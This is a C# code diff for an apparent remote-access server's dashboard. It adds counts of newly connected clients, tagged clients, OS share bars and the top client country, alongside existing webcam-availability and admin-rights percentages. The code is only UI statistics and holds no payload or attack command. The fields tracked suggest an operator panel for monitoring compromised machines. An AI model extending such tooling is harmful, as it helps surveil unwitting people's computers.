@@ -715,6 +715,7 @@ public partial class ServerWindow : Window
         }
 
         int peak = Math.Max(1, counts.Max());
+        DashPeak.Text = counts.Max() == 0 ? "—" : counts.Max().ToString();
 
         // Remove previous dynamic children (keep Polyline and Polygon which are declared in XAML)
         for (int i = DashChart.Children.Count - 1; i >= 0; i--)
@@ -804,6 +805,27 @@ public partial class ServerWindow : Window
         AnimateCounter(DashOnline, online);
         AnimateCounter(DashTotal,  total);
 
+        DashLastUpdated.Text = DateTime.Now.ToString("HH:mm:ss");
+
+        // ── New 24h: unique clients that connected in the last 24h ──────────
+        var now = DateTime.UtcNow;
+        int new24h = 0;
+        foreach (var rec in _store.AllClients.Values)
+        {
+            lock (rec.ActivityLog)
+            {
+                if (rec.ActivityLog.Any(e =>
+                    (now - e.Time).TotalHours < 24 &&
+                    e.Action.StartsWith("Connected", StringComparison.OrdinalIgnoreCase)))
+                    new24h++;
+            }
+        }
+        AnimateCounter(DashNew24h, new24h);
+
+        // ── Tagged count (all records) ─────────────────────────────────────
+        int tagged = _store.AllClients.Values.Count(r => !string.IsNullOrEmpty(r.Tag));
+        DashTagged.Text = tagged.ToString();
+
         // ── Stat pills (from currently online clients) ──────────────────────
         var clients = _server?.ConnectedClients.Values.ToList() ?? [];
         int n = clients.Count;
@@ -811,16 +833,33 @@ public partial class ServerWindow : Window
         {
             int win11   = clients.Count(c => c.OS.Contains("11"));
             int win10   = clients.Count(c => c.OS.Contains("10") && !c.OS.Contains("11"));
+            int other   = n - win11 - win10;
             int cam     = clients.Count(c => c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase));
             int admin   = clients.Count(c => c.IsAdmin);
-            DashWin11.Text  = $"{win11 * 100 / n}%";
-            DashWin10.Text  = $"{win10 * 100 / n}%";
-            DashWebcam.Text = $"{cam   * 100 / n}%";
-            DashAdmin.Text  = $"{admin * 100 / n}%";
+            DashWin11.Text   = $"{win11 * 100 / n}%";
+            DashWin10.Text   = $"{win10 * 100 / n}%";
+            DashOsOther.Text = $"{other * 100 / n}%";
+            DashWebcam.Text  = $"{cam   * 100 / n}%";
+            DashAdmin.Text   = $"{admin * 100 / n}%";
+            DashOsWin11Bar.Value = win11 * 100 / n;
+            DashOsWin10Bar.Value = win10 * 100 / n;
+            DashOsOtherBar.Value = other * 100 / n;
+
+            var topGroup = clients
+                .Where(c => !string.IsNullOrEmpty(c.Country) && c.Country != "...")
+                .GroupBy(c => c.Country)
+                .OrderByDescending(g => g.Count())
+                .FirstOrDefault();
+            DashTopCountry.Text = topGroup != null
+                ? $"{topGroup.Key} ×{topGroup.Count()}"
+                : "—";
         }
         else
         {
-            DashWin11.Text = DashWin10.Text = DashWebcam.Text = DashAdmin.Text = "—";
+            DashWin11.Text = DashWin10.Text = DashOsOther.Text = "—";
+            DashWebcam.Text = DashAdmin.Text = "—";
+            DashTopCountry.Text = "—";
+            DashOsWin11Bar.Value = DashOsWin10Bar.Value = DashOsOtherBar.Value = 0;
         }
 
         // ── 24h activity chart ──────────────────────────────────────────────
